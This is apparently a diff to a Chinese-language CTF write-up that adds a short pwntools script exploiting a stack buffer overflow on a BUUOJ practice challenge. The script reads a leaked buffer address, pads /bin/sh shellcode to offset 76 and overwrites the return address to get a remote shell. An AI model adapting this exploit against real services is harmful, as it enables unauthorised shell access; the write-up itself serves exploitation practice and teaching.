@@ -752,3 +752,25 @@ buf_addr = int(io.recvline().strip(),16)
 <img width="305" height="66" alt="image" src="https://github.com/user-attachments/assets/75245759-08c6-413a-9e9d-6b81154f01f7" />
 
 所以我们不应该像之前的题目一样执行 `x/wx $esp`，而应该执行 `x/wx $eip`。
+
+```
+# written by Sonnety
+from pwn import *
+
+context.arch="i386"
+host = "node5.buuoj.cn"
+port = 27629
+offset = 76
+
+def main():
+    io = remote(host,port)
+    io.recvuntil(b"Hei,give you a gift->")
+    buf_addr = int(io.recvline().strip(),16)
+    shellcode = asm(shellcraft.sh())
+    payload=shellcode.ljust(offset,b"\x90")+p32(buf_addr)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
